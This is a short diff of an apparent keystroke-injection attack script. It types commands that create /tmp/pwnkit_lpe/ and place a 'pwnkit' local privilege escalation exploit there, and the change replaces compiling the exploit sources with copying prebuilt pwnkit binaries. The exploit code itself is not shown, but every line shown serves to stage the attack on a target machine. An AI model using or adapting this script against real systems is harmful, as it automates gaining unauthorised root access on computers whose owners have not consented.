@@ -58,11 +58,11 @@ Q STRING "mkdir /tmp/pwnkit_lpe/"
 Q ENTER
 Q DELAY 1500
 
-Q STRING "gcc -shared -o /tmp/pwnkit_lpe/pwnkit.so -fPIC ./library.c"
+Q STRING "cp pwnkit.so /tmp/pwnkit_lpe/pwnkit.so"
 Q ENTER
 Q DELAY 1500
 
-Q STRING "gcc ./exploit.c -o /tmp/pwnkit_lpe/pwnkit"
+Q STRING "cp pwnkit /tmp/pwnkit_lpe/pwnkit"
 Q ENTER
 Q DELAY 1500
 
